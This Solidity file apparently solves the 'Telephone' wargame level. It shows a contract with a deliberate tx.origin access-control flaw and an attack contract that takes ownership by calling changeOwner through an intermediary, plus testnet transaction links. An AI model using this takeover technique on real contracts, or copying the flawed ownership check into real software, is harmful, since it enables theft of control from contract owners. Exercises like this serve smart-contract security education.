// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

/*
* Objective :
* - Claim ownership of the contract below to complete this level.
*/

contract Telephone {
    address public owner;

    constructor() {
        owner = msg.sender;
    }

    function changeOwner(address _owner) public {
        // @issue: any contract can call this function and change the owner
        if (tx.origin != msg.sender) {
            owner = _owner;
        }
    }
}

// https://sepolia.etherscan.io/tx/0xcfc97a6a9880cf86067dae3cef39ba3c073b99045cb36d0332886fcc21def015
contract TelephoneAttack {
    Telephone public target;

    constructor(address _target) {
        target = Telephone(_target);
    }

    function attack(address _attacker) public {
        target.changeOwner(_attacker);
    }
}

// https://sepolia.etherscan.io/tx/0x706825d1f27e083a33bab533e8c9a81d3871f0fa422214f856d9f01e6adfa496

// https://sepolia.etherscan.io/tx/0xfe86489ecae94d678f99e1e7bbcf73d969edd29258c6404c84c77bd4de1cfb17